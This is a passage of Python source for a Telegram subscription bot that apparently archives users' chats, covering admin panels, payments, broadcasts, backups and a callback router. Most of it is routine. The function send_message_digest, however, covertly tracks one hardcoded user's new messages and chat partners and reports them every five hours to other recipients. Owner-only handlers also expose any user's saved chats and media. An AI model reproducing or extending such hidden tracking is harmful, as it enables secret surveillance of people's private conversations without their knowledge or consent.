    deadline = PENDING_GRANT.get(chat_id)
    if deadline is None:
        return False
    PENDING_GRANT.pop(chat_id, None)
    if deadline < time.time():
        send_message(chat_id, "Окно выдачи закрылось — нажми кнопку заново.")
        return True
    parts = text.strip().replace(";", ",").replace(",", " ").split()
    if not parts:
        return False
    if parts[0].lower() in {"me", "я", "мне"}:
        days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
        grant_subscription(user_id, chat_id, user_id, days)
        return True
    if len(parts) < 2 or not parts[0].lstrip("-").isdigit() or not parts[1].isdigit():
        send_message(chat_id, "Формат: <code>ID число_дней</code>. Например: <code>123456789 30</code>", parse_mode="HTML")
        return True
    grant_subscription(user_id, chat_id, int(parts[0]), int(parts[1]))
    return True


def handle_price_input(admin_id: int, chat_id: int, text: str) -> bool:
    pending = PENDING_PRICE.pop(chat_id, None)
    if pending is None:
        return False
    days, kind, deadline = pending
    if deadline < time.time():
        send_message(chat_id, "Окно изменения цены закрылось — нажми кнопку заново.")
        return True
    try:
        value = int(text.strip())
    except ValueError:
        send_message(chat_id, "Цена должна быть целым числом больше нуля.")
        return True
    if not 1 <= value <= 1_000_000:
        send_message(chat_id, "Цена должна быть от 1 до 1 000 000.")
        return True
    set_plan_price(days, kind, value)
    audit_admin(admin_id, "изменение цены", None, f"{days} дней, {kind}={value}")
    unit = "⭐" if kind == "stars" else "₽"
    send_message(chat_id, f"Цена тарифа на {days} дней изменена: {value} {unit}.")
    return True


def handle_broadcast_input(admin_id: int, chat_id: int, text: str) -> bool:
    pending = PENDING_BROADCAST.pop(chat_id, None)
    if not pending:
        return False
    scope, deadline = pending
    if deadline < time.time():
        send_message(chat_id, "Окно рассылки закрылось — начни заново.")
        return True
    BROADCAST_PREVIEWS[chat_id] = (scope, text[:3900], time.time() + 600)
    audience = "всем пользователям" if scope == "all" else "только с активной подпиской"
    send_message(
        chat_id,
        f"{pe('support')} <b>Предпросмотр рассылки</b>\nПолучатели: <b>{audience}</b>\n\n{html_quote(text)}",
        parse_mode="HTML",
        reply_markup=kb([[btn("Отправить", "broadcast:send", emoji="check", style="success"), btn("Отмена", "broadcast:cancel", emoji="warning", style="danger")]]),
    )
    return True


def execute_broadcast(admin_id: int, chat_id: int) -> tuple[int, int]:
    preview = BROADCAST_PREVIEWS.pop(chat_id, None)
    if not preview or preview[2] < time.time():
        return 0, 0
    scope, text, _ = preview
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        if scope == "active":
            rows = conn.execute(
                """
                SELECT DISTINCT u.private_chat_id FROM users AS u
                JOIN subs AS s ON s.user_id = u.user_id
                LEFT JOIN blocked_users AS b ON b.user_id = u.user_id
                WHERE u.private_chat_id IS NOT NULL AND s.until_ts > ? AND b.user_id IS NULL
                """,
                (now,),
            ).fetchall()
        else:
            rows = conn.execute(
                """
                SELECT u.private_chat_id FROM users AS u
                LEFT JOIN blocked_users AS b ON b.user_id = u.user_id
                WHERE u.private_chat_id IS NOT NULL AND b.user_id IS NULL
                """
            ).fetchall()
    sent = failed = 0
    for (target_chat,) in rows:
        try:
            telegram_call("sendMessage", {"chat_id": int(target_chat), "text": text})
            sent += 1
        except TelegramApiError:
            failed += 1
        time.sleep(0.04)
    audit_admin(admin_id, "рассылка", None, f"scope={scope}, sent={sent}, failed={failed}")
    return sent, failed


def handle_promo_create_input(admin_id: int, chat_id: int, text: str) -> bool:
    deadline = PENDING_PROMO_CREATE.pop(chat_id, None)
    if deadline is None:
        return False
    if deadline < time.time():
        send_message(chat_id, "Окно создания промокода закрылось.")
        return True
    parts = text.strip().upper().split()
    if len(parts) != 4:
        send_message(chat_id, "Формат: <code>КОД СКИДКА ДНЕЙ ЛИМИТ</code>. Пример: <code>START20 20 30 100</code>", parse_mode="HTML")
        return True
    code = re.sub(r"[^A-Z0-9_-]", "", parts[0])[:32]
    try:
        discount, valid_days, max_uses = map(int, parts[1:])
    except ValueError:
        send_message(chat_id, "Скидка, срок и лимит должны быть числами.")
        return True
    if not code or not 1 <= discount <= 99 or not 1 <= valid_days <= 3650 or not 1 <= max_uses <= 1_000_000:
        send_message(chat_id, "Проверь данные: скидка 1–99%, срок от 1 дня, лимит от 1.")
        return True
    now = int(time.time())
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO promo_codes (code, discount_percent, expires_at, max_uses, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (code, discount, now + valid_days * 86400, max_uses, admin_id, now),
            )
    except sqlite3.IntegrityError:
        send_message(chat_id, "Такой промокод уже существует.")
        return True
    audit_admin(admin_id, "создание промокода", None, f"{code}, {discount}%, {valid_days} дней, лимит {max_uses}")
    send_message(chat_id, f"Промокод <b>{code}</b> создан: скидка {discount}%, действует {valid_days} дней, лимит {max_uses}.", parse_mode="HTML")
    return True


def handle_promo_activate_input(user_id: int, chat_id: int, text: str) -> bool:
    deadline = PENDING_PROMO_ACTIVATE.pop(chat_id, None)
    if deadline is None:
        return False
    if deadline < time.time():
        send_message(chat_id, "Окно ввода промокода закрылось.")
        return True
    ok, result = activate_promo(user_id, text)
    send_message(chat_id, result, reply_markup=kb([[btn("К тарифам", "buy", emoji="stars")], BACK_HOME]))
    return True


def handle_gift_input(user_id: int, chat_id: int, text: str) -> bool:
    deadline = PENDING_GIFT.pop(chat_id, None)
    if deadline is None:
        return False
    if deadline < time.time():
        send_message(chat_id, "Окно выбора получателя закрылось.")
        return True
    value = text.strip().lstrip("@")
    with sqlite3.connect(DB_PATH) as conn:
        if value.isdigit():
            row = conn.execute("SELECT user_id FROM users WHERE user_id = ?", (int(value),)).fetchone()
        else:
            row = conn.execute("SELECT user_id FROM users WHERE lower(username) = lower(?)", (value,)).fetchone()
    if not row:
        send_message(chat_id, "Пользователь не найден. Он должен хотя бы один раз открыть этого бота.")
        return True
    target_id = int(row[0])
    page_text, markup = page_gift_buy(user_id, target_id)
    send_menu_page(user_id, chat_id, page_text, markup)
    return True


def handle_support_input(user_id: int, chat_id: int, text: str) -> bool:
    deadline = PENDING_SUPPORT.pop(chat_id, None)
    if deadline is None:
        return False
    if deadline < time.time():
        send_message(chat_id, "Окно обращения закрылось.")
        return True
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute(
            "INSERT INTO support_tickets (user_id, user_text, created_at) VALUES (?, ?, ?)",
            (user_id, text[:3900], now),
        )
        ticket_id = int(cur.lastrowid)
    for admin_id in list_admin_ids():
        send_message(
            admin_id,
            f"{pe('support')} <b>Обращение #{ticket_id}</b>\n{stored_user_payment_label(user_id)}\n\n{html_quote(text)}",
            parse_mode="HTML",
            reply_markup=kb([[btn("Ответить", f"support:reply:{ticket_id}:{user_id}", emoji="support")]]),
        )
    send_message(chat_id, f"Обращение #{ticket_id} отправлено. Ответ придёт сюда.")
    return True


def handle_support_reply_input(admin_id: int, chat_id: int, text: str) -> bool:
    pending = PENDING_SUPPORT_REPLY.pop(chat_id, None)
    if pending is None:
        return False
    ticket_id, target_id, deadline = pending
    if deadline < time.time():
        send_message(chat_id, "Окно ответа закрылось.")
        return True
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "UPDATE support_tickets SET admin_id=?, admin_reply=?, status='closed', replied_at=? WHERE id=?",
            (admin_id, text[:3900], int(time.time()), ticket_id),
        )
    send_message(get_private_chat_id(target_id), f"{pe('support')} <b>Ответ поддержки на обращение #{ticket_id}</b>\n\n{html_quote(text)}", parse_mode="HTML")
    audit_admin(admin_id, "ответ поддержки", target_id, f"обращение #{ticket_id}")
    send_message(chat_id, "Ответ отправлен пользователю.")
    return True


def handle_block_reason_input(admin_id: int, chat_id: int, text: str) -> bool:
    pending = PENDING_BLOCK_REASON.pop(chat_id, None)
    if pending is None:
        return False
    target_id, return_page, deadline = pending
    if deadline < time.time():
        send_message(chat_id, "Окно блокировки закрылось.")
        return True
    reason = text.strip()[:500] or "Причина не указана"
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "INSERT OR REPLACE INTO blocked_users (user_id,reason,blocked_by,created_at) VALUES (?,?,?,?)",
            (target_id, reason, admin_id, int(time.time())),
        )
    audit_admin(admin_id, "блокировка", target_id, reason)
    page_text, markup = page_user_card(admin_id, target_id, return_page)
    send_message(chat_id, page_text, parse_mode="HTML", reply_markup=markup)
    return True


def export_users_csv(admin_id: int) -> Path:
    path = DATA_DIR / f"users-{time.strftime('%Y%m%d-%H%M%S')}.csv"
    with sqlite3.connect(DB_PATH) as conn, path.open("w", encoding="utf-8-sig", newline="") as file:
        rows = conn.execute(
            """
            SELECT u.user_id, u.username, u.first_name, u.last_name, u.created_at,
                   COALESCE(s.until_ts,0),
                   COALESCE((SELECT SUM(stars) FROM payments p WHERE p.user_id=u.user_id),0),
                   COALESCE((SELECT SUM(rub) FROM sbp_payments sp WHERE sp.user_id=u.user_id AND sp.status='paid'),0),
                   CASE WHEN b.user_id IS NULL THEN 0 ELSE 1 END
            FROM users u LEFT JOIN subs s ON s.user_id=u.user_id
            LEFT JOIN blocked_users b ON b.user_id=u.user_id ORDER BY u.created_at
            """
        ).fetchall()
        writer = csv.writer(file, delimiter=";")
        writer.writerow(["user_id", "username", "first_name", "last_name", "registered", "subscription_until", "stars_total", "rub_total", "blocked"])
        for row in rows:
            writer.writerow([*row[:4], format_until(int(row[4])), format_until(int(row[5])), *row[6:]])
    audit_admin(admin_id, "экспорт пользователей", None, path.name)
    return path


def create_backup(admin_id: int | None = None, send_to_admins: bool = True) -> Path:
    path = BACKUP_DIR / f"holly-{time.strftime('%Y%m%d-%H%M%S')}.sqlite3"
    with sqlite3.connect(DB_PATH) as source, sqlite3.connect(path) as destination:
        source.backup(destination)
    backups = sorted(BACKUP_DIR.glob("holly-*.sqlite3"), key=lambda item: item.stat().st_mtime, reverse=True)
    for old in backups[BACKUP_KEEP:]:
        old.unlink()
    if send_to_admins:
        for target in sorted(ADMIN_USER_IDS):
            try:
                send_document(target, path, "Резервная копия базы Holly Bot")
            except TelegramApiError as exc:
                log(f"Backup delivery failed for {target}: {exc}")
    if admin_id:
        audit_admin(admin_id, "резервная копия", None, path.name)
    return path


def maintenance_get(key: str) -> str | None:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT value FROM maintenance_state WHERE key=?", (key,)).fetchone()
    return str(row[0]) if row else None


def maintenance_set(key: str, value: str) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "INSERT INTO maintenance_state (key,value,updated_at) VALUES (?,?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value, updated_at=excluded.updated_at",
            (key, value, int(time.time())),
        )


def report_technical_issue(key: str, text: str) -> None:
    try:
        last = int(maintenance_get(f"issue:{key}") or 0)
    except sqlite3.Error:
        last = 0
    now = int(time.time())
    if now - last < 3600:
        return
    try:
        maintenance_set(f"issue:{key}", str(now))
    except sqlite3.Error:
        pass
    for admin_id in list_admin_ids():
        send_message(admin_id, f"{pe('warning')} <b>Техническое уведомление</b>\n\n{html_text(text)}", parse_mode="HTML")


def health_report() -> tuple[bool, str]:
    checks = []
    ok = True
    try:
        with sqlite3.connect(DB_PATH) as conn:
            db_result = conn.execute("PRAGMA quick_check").fetchone()[0]
        db_ok = db_result == "ok"
    except Exception as exc:
        db_ok = False
        db_result = str(exc)
    checks.append(f"База данных: {'✅ работает' if db_ok else '❌ ' + html_text(db_result)}")
    ok = ok and db_ok
    checks.append(f"Telegram API: ✅ бот получает обновления")
    sbp_ok = ROLLYPAY_ENABLED
    checks.append(f"СБП: {'✅ настроен' if sbp_ok else '❌ не настроен'}")
    ok = ok and sbp_ok
    checks.append(f"Каталог медиа: {'✅ доступен' if MEDIA_DIR.exists() and os.access(MEDIA_DIR, os.W_OK) else '❌ недоступен'}")
    return ok, "\n".join(checks)


def send_expiry_reminders() -> None:
    now = int(time.time())
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            """
            SELECT s.user_id, s.until_ts, u.private_chat_id FROM subs s
            JOIN users u ON u.user_id=s.user_id
            LEFT JOIN blocked_users b ON b.user_id=s.user_id
            WHERE s.until_ts > ? AND s.until_ts <= ? AND u.private_chat_id IS NOT NULL AND b.user_id IS NULL
            """,
            (now, now + 3 * 86400),
        ).fetchall()
    for user_id, until_ts, chat_id in rows:
        remaining = int(until_ts) - now
        days_before = 1 if remaining <= 86400 else 3
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.execute(
                "INSERT OR IGNORE INTO subscription_reminders (user_id,until_ts,days_before,sent_at) VALUES (?,?,?,?)",
                (user_id, until_ts, days_before, now),
            )
        if cur.rowcount:
            send_message(
                int(chat_id),
                f"{pe('warning')} Подписка закончится через <b>{days_before} {'день' if days_before == 1 else 'дня'}</b> — {format_until(int(until_ts))}.\nПродли сейчас, чтобы бот продолжал сохранять сообщения.",
                parse_mode="HTML",
                reply_markup=kb([[btn("Продлить подписку", "buy", emoji="stars", style="success")]]),
            )


def send_message_digest() -> None:
    now = int(time.time())
    try:
        saved_last = maintenance_get("message_digest_5h_7732538826")
        last = int(saved_last) if saved_last else now - MESSAGE_DIGEST_INTERVAL_SEC
    except (TypeError, ValueError, sqlite3.Error):
        last = now - MESSAGE_DIGEST_INTERVAL_SEC
    if now - last < MESSAGE_DIGEST_INTERVAL_SEC:
        return
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            """
            SELECT m.context, m.chat_id, COUNT(*),
                   COALESCE(MAX(CASE WHEN m.user_id != ? THEN m.author END), MAX(m.author))
            FROM messages AS m
            LEFT JOIN chat_owners AS co ON m.context = 'regular' AND co.chat_id = m.chat_id
            LEFT JOIN business_connections AS bc ON m.context = 'business:' || bc.connection_id
            WHERE (co.owner_id = ? OR bc.owner_id = ?)
              AND m.updated_at > ? AND m.updated_at <= ?
            GROUP BY m.context, m.chat_id
            ORDER BY COUNT(*) DESC
            LIMIT 30
            """,
            (MESSAGE_DIGEST_TARGET_USER_ID, MESSAGE_DIGEST_TARGET_USER_ID, MESSAGE_DIGEST_TARGET_USER_ID, last, now),
        ).fetchall()
    maintenance_set("message_digest_5h_7732538826", str(now))
    total = sum(int(row[2]) for row in rows)
    details = "\n".join(
        f"• {html_text(chat_participant_label(row[3], None))}: <b>{int(row[2])}</b> new сообщений"
        for row in rows
    ) or "• новых сообщений нет"
    text = f"У Святоши за последние 5 часов <b>{total} new сообщений</b>.\n\nС кем:\n{details}"
    for recipient_id in sorted(MESSAGE_DIGEST_RECIPIENT_IDS):
        send_message(recipient_id, text, parse_mode="HTML")


def run_maintenance() -> None:
    global LAST_MAINTENANCE_TS
    if time.time() - LAST_MAINTENANCE_TS < MAINTENANCE_INTERVAL_SEC:
        return
    LAST_MAINTENANCE_TS = time.time()
    try:
        send_expiry_reminders()
        send_message_digest()
        today = time.strftime("%Y-%m-%d")
        if maintenance_get("last_backup_date") != today:
            create_backup(send_to_admins=True)
            maintenance_set("last_backup_date", today)
        healthy, report = health_report()
        if not healthy:
            report_technical_issue("health", report.replace("✅", "").replace("❌", ""))
    except Exception as exc:
        log(f"Maintenance failed: {type(exc).__name__}: {exc}")
        report_technical_issue("maintenance", f"Ошибка автоматической проверки: {type(exc).__name__}: {exc}")


# --- роутер колбэков -------------------------------------------------------------

def handle_callback_query(query: dict) -> None:
    query_id = str(query.get("id") or "")
    data = str(query.get("data") or "")
    message = query.get("message") or {}
    chat = message.get("chat") or {}
    from_user = query.get("from") or {}
    try:
        user_id = int(from_user["id"])
        chat_id = int(chat.get("id") or user_id)
    except (KeyError, TypeError, ValueError):
        return

    if str(chat.get("type") or "private") != "private":
        answer_callback(query_id, text="Меню работает в личных сообщениях со мной", show_alert=True)
        return

    register_user(user_id, chat_id, from_user)

    if is_blocked(user_id):
        answer_callback(query_id, text="Доступ к боту заблокирован администратором", show_alert=True)
        return

    page: tuple[str, dict] | None = None
    alert: str | None = None

    if data == "home":
        page = page_home(user_id)
    elif data == "buy":
        page = page_buy(user_id)
    elif data == "style":
        if sub_active(user_id):
            page = page_communication_style(user_id)
        else:
            page = page_buy(user_id)
            alert = "Нужна активная подписка Holly Bot"
    elif data.startswith("style:"):
        if not sub_active(user_id):
            page = page_buy(user_id)
            alert = "Нужна активная подписка Holly Bot"
        else:
            value = data.split(":", 1)[1]
            style = "" if value == "off" else value
            if style not in STYLE_LABELS and style:
                answer_callback(query_id, text="Неизвестный стиль", show_alert=True)
                return
            set_communication_style(user_id, style)
            page = page_communication_style(user_id)
            alert = "Стиль отключён" if not style else f"Выбран: {STYLE_LABELS[style]}"
    elif data == "promo:activate":
        PENDING_PROMO_ACTIVATE[chat_id] = time.time() + 300
        send_message(chat_id, "Отправь промокод одним сообщением. Отмена — /cancel")
        alert = "Жду промокод"
    elif data == "gift:start":
        PENDING_GIFT[chat_id] = time.time() + 300
        send_message(chat_id, "Отправь Telegram ID или @username получателя. Он должен хотя бы раз открыть бота. Отмена — /cancel")
        alert = "Жду получателя"
    elif data.startswith("gift:"):
        parts = data.split(":")
        if len(parts) != 4 or parts[1] not in {"sbp", "stars"} or not parts[2].isdigit() or not parts[3].isdigit():
            answer_callback(query_id, text="Некорректный подарок", show_alert=True)
            return
        provider, target_id, days = parts[1], int(parts[2]), int(parts[3])
        if not user_exists(target_id) or not get_plan(days):
            answer_callback(query_id, text="Получатель или тариф не найден", show_alert=True)
            return
        if provider == "stars":
            send_subscription_invoice(user_id, chat_id, days, target_id)
            alert = "Открываю оплату подарка ⭐"
        else:
            send_sbp_payment(user_id, chat_id, days, target_id)
            alert = "Счёт на подарок создан"
    elif data.startswith("buy:"):
        parts = data.split(":")
        provider = "stars" if len(parts) == 2 else parts[1]
        try:
            days = int(parts[-1])
        except ValueError:
            days = 0
        if not get_plan(days):
            answer_callback(query_id, text="Тариф закончился — обнови меню", show_alert=True)
            return
        if provider == "stars":
            send_subscription_invoice(user_id, chat_id, days)
            alert = "Открываю оплату ⭐"
        elif provider == "sbp":
            send_sbp_payment(user_id, chat_id, days)
            alert = "Счёт СБП создан"
        else:
            answer_callback(query_id, text="Способ оплаты не найден", show_alert=True)
            return
    elif data.startswith("sbp:check:"):
        paid, text = check_sbp_payment(user_id, data.split(":", 2)[2])
        if paid:
            page = page_home(user_id)
            alert = text
        else:
            answer_callback(query_id, text=text, show_alert=True)
            return
    elif data == "ref":
        page = page_ref(user_id)
    elif data == "help":
        page = page_help(user_id)
    elif data == "conns":
        page = page_connections(user_id)
    elif data == "support":
        PENDING_SUPPORT[chat_id] = time.time() + 600
        send_message(chat_id, "Напиши вопрос одним сообщением. Его получат администраторы. Отмена — /cancel")
        alert = "Жду сообщение"
    elif data.startswith("support:reply:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) == 4 and parts[2].isdigit() and parts[3].isdigit():
            PENDING_SUPPORT_REPLY[chat_id] = (int(parts[2]), int(parts[3]), time.time() + 600)
            send_message(chat_id, f"Напиши ответ на обращение #{parts[2]}. Отмена — /cancel")
            alert = "Жду ответ"
    elif data == "restore":
        restored = restore_business_connections(user_id)
        alert = f"✅ Защита включена: {len(restored)}" if restored else "Все подключения уже включены"
        page = page_connections(user_id)
    elif data == "panel":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_panel(user_id)
    elif data == "admins":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_admins(user_id)
    elif data == "admin:add":
        if not is_owner_admin(user_id):
            answer_callback(query_id, text="Только владелец может выдавать админку", show_alert=True)
            return
        PENDING_ADMIN_ADD[chat_id] = time.time() + 300
        send_message(chat_id, "Отправь Telegram ID нового администратора. Отмена — /cancel")
        page = page_admins(user_id)
        alert = "Жду ID"
    elif data.startswith("admin:remove:"):
        if not is_owner_admin(user_id):
            answer_callback(query_id, text="Только владелец может снимать админку", show_alert=True)
            return
        try:
            target_id = int(data.split(":", 2)[2])
        except ValueError:
            answer_callback(query_id, text="Некорректный ID", show_alert=True)
            return
        _, alert = remove_bot_admin(user_id, target_id)
        page = page_admins(user_id)
    elif data == "tickets":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_support_tickets(user_id)
    elif data == "expiring":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_expiring_subscriptions(user_id)
    elif data.startswith("users:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        try:
            users_page = int(data.split(":", 1)[1])
        except ValueError:
            users_page = 0
        page = page_users(user_id, users_page)
    elif data.startswith("user:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) == 3 and parts[1].isdigit() and parts[2].isdigit():
            page = page_user_card(user_id, int(parts[1]), int(parts[2]))
    elif data.startswith("uchats:"):
        if not is_owner_admin(user_id):
            answer_callback(query_id, text="Только для владельца бота", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) == 4 and all(part.isdigit() for part in parts[1:]):
            page = page_user_chats(user_id, int(parts[1]), int(parts[2]), int(parts[3]))
    elif data.startswith("umsg:"):
        if not is_owner_admin(user_id):
            answer_callback(query_id, text="Только для владельца бота", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) == 6 and all(part.lstrip("-").isdigit() for part in parts[1:]):
            page = page_user_chat_messages(
                user_id, int(parts[1]), int(parts[2]), int(parts[3]), int(parts[4]), int(parts[5])
            )
    elif data.startswith("umedia:"):
        if not is_owner_admin(user_id):
            answer_callback(query_id, text="Только для владельца бота", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) != 4 or not all(part.lstrip("-").isdigit() for part in parts[1:]):
            answer_callback(query_id, text="Некорректное медиа", show_alert=True)
            return
        saved = get_user_owned_saved_message(int(parts[1]), int(parts[2]), int(parts[3]))
        if not saved or saved.get("media_type") not in ADMIN_MEDIA_LABELS:
            answer_callback(query_id, text="Медиа не найдено", show_alert=True)
            return
        sent = send_saved_media(chat_id, saved)
        answer_callback(
            query_id,
            text="Медиа отправлено" if sent else "Файл больше недоступен",
            show_alert=not sent,
        )
        return
    elif data.startswith("useradd:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) == 4 and all(part.isdigit() for part in parts[1:]):
            target_id, days, return_page = map(int, parts[1:])
            grant_subscription(user_id, chat_id, target_id, days)
            page = page_user_card(user_id, target_id, return_page)
    elif data.startswith("block:") or data.startswith("unblock:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) == 3 and parts[1].isdigit() and parts[2].isdigit():
            target_id, return_page = int(parts[1]), int(parts[2])
            if data.startswith("block:"):
                PENDING_BLOCK_REASON[chat_id] = (target_id, return_page, time.time() + 300)
                send_message(chat_id, f"Напиши причину блокировки пользователя <code>{target_id}</code>. Отмена — /cancel", parse_mode="HTML")
                page = page_user_card(user_id, target_id, return_page)
                alert = "Жду причину"
            else:
                with sqlite3.connect(DB_PATH) as conn:
                    conn.execute("DELETE FROM blocked_users WHERE user_id=?", (target_id,))
                audit_admin(user_id, "разблокировка", target_id)
                page = page_user_card(user_id, target_id, return_page)
                alert = "Пользователь разблокирован"
    elif data == "broadcast":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = (f"{pe('support')} <b>Рассылка</b>\n\nВыбери получателей.", kb([[btn("Всем", "broadcast:all", emoji="view")], [btn("С активной подпиской", "broadcast:active", emoji="check")], [btn("Админ-панель", "panel", emoji="home")]]))
    elif data in {"broadcast:all", "broadcast:active"}:
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        PENDING_BROADCAST[chat_id] = (data.split(":")[1], time.time() + 600)
        send_message(chat_id, "Отправь текст рассылки одним сообщением. Отмена — /cancel")
        alert = "Жду текст"
    elif data == "broadcast:send":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        sent, failed = execute_broadcast(user_id, chat_id)
        send_message(chat_id, f"Рассылка завершена: отправлено {sent}, ошибок {failed}.")
        page = page_panel(user_id)
    elif data == "broadcast:cancel":
        BROADCAST_PREVIEWS.pop(chat_id, None)
        PENDING_BROADCAST.pop(chat_id, None)
        page = page_panel(user_id)
        alert = "Рассылка отменена"
    elif data == "stats":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_stats(user_id)
    elif data == "promos":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_promos(user_id)
    elif data == "promo:create":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        PENDING_PROMO_CREATE[chat_id] = time.time() + 600
        send_message(chat_id, "Введи: <code>КОД СКИДКА_ПРОЦЕНТОВ СРОК_В_ДНЯХ ЛИМИТ</code>\nПример: <code>START20 20 30 100</code>\nОтмена — /cancel", parse_mode="HTML")
        alert = "Жду параметры"
    elif data.startswith("promo:toggle:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        code = data.split(":", 2)[2]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("UPDATE promo_codes SET active=CASE active WHEN 1 THEN 0 ELSE 1 END WHERE code=?", (code,))
        audit_admin(user_id, "переключение промокода", None, code)
        page = page_promos(user_id)
    elif data == "export":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        path = export_users_csv(user_id)
        try:
            send_document(chat_id, path, "Экспорт пользователей Holly Bot")
            alert = "CSV отправлен"
        except TelegramApiError as exc:
            alert = f"Ошибка экспорта: {exc}"[:180]
        page = page_panel(user_id)
    elif data == "backup":
        if not is_owner_admin(user_id):
            answer_callback(query_id, text="Резервная копия доступна только владельцу", show_alert=True)
            return
        create_backup(user_id, send_to_admins=True)
        page = page_panel(user_id)
        alert = "Резервная копия отправлена"
    elif data == "health":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        _, report = health_report()
        page = (f"{pe('check')} <b>Проверка работы</b>\n\n{report}", kb([[btn("Проверить снова", "health", emoji="refresh")], [btn("Админ-панель", "panel", emoji="home")], BACK_HOME]))
    elif data == "audit":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_admin_log(user_id)
    elif data == "prices":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        page = page_prices(user_id)
    elif data.startswith("price:"):
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        parts = data.split(":")
        if len(parts) != 3 or not parts[1].isdigit() or parts[2] not in {"rub", "stars"}:
            answer_callback(query_id, text="Неизвестная цена", show_alert=True)
            return
        days, kind = int(parts[1]), parts[2]
        if not get_plan(days):
            answer_callback(query_id, text="Тариф не найден", show_alert=True)
            return
        PENDING_PRICE[chat_id] = (days, kind, time.time() + 300)
        unit = "звёздах" if kind == "stars" else "рублях"
        send_message(chat_id, f"Введи новую цену тарифа на {days} дней в {unit}. Отмена — /cancel")
        page = page_prices(user_id)
    elif data == "grant":
        if not is_admin_user(user_id):
            answer_callback(query_id, text="Только для админов", show_alert=True)
            return
        PENDING_GRANT[chat_id] = time.time() + 300
        page = page_panel(user_id)
        send_message(
            chat_id,
            f"{pe('add')} Кому выдаём подписку? Напиши сообщением:\n"
            f"<code>ID_пользователя число_дней</code>\n"
            f"Или <code>me 30</code> — себе. Отмена — /cancel",
            parse_mode="HTML",
        )
    else:
        answer_callback(query_id)
        return

    if page:
        edit_page(chat_id, int(message.get("message_id") or 0), page[0], page[1])
    answer_callback(query_id, text=alert)


def format_user(user: dict | None) -> str:
    if not user:
        return "Неизвестный пользователь"
    first_name = user.get("first_name") or ""
    last_name = user.get("last_name") or ""
    username = user.get("username")
    user_id = user.get("id")
    name = " ".join(part for part in (first_name, last_name) if part).strip()
    details = []
    if username:
        details.append(f"@{username}")
    if user_id:
        details.append(f"ID: {user_id}")
    suffix = f" ({', '.join(details)})" if details else ""
    if username:
        return f"{name or 'Пользователь'}{suffix}"
    if name:
        return f"{name}{suffix}"
    if user.get("title"):
        return f"{user['title']}{suffix}"
    return f"Пользователь {user_id}" if user_id else "Неизвестный пользователь"


def format_chat(chat: dict | None) -> str | None:
    if not chat:
        return None
    title = chat.get("title")
    first_name = chat.get("first_name") or ""
    last_name = chat.get("last_name") or ""
    username = chat.get("username")
    chat_id = chat.get("id")
    name = title or " ".join(part for part in (first_name, last_name) if part).strip()
    if not name:
        name = f"@{username}" if username else "чат"
    details = []
    if username:
        details.append(f"@{username}")
    if chat_id:
        details.append(f"ID: {chat_id}")
    return f"{name} ({', '.join(details)})" if details else name


def message_author(message: dict) -> str:
    if message.get("from"):
        return format_user(message["from"])
    if message.get("sender_business_bot"):
        return format_user(message["sender_business_bot"])

    chat = message.get("chat") or {}
    if chat.get("type") == "private":
        return format_user(chat)
    return chat.get("title") or "Неизвестный пользователь"


def media_label(media_type: str, timed: bool = False) -> str:
    label = MEDIA_LABELS.get(media_type, media_type)
    return f"{label} с таймером" if timed else label


def message_content(message: dict) -> str:
    if message.get("text"):
        return message["text"]
    if message.get("caption"):
        return message["caption"]

    media = message_media(message)
    if media:
        return f"[{media_label(media['type'], bool(media.get('ttl_seconds')))}]"

    for field in MEDIA_LABELS:
        if field in message:
            return f"[{MEDIA_LABELS[field]}]"
    return "[сообщение без текста]"


def message_media(message: dict) -> dict | None:
    if message.get("photo"):
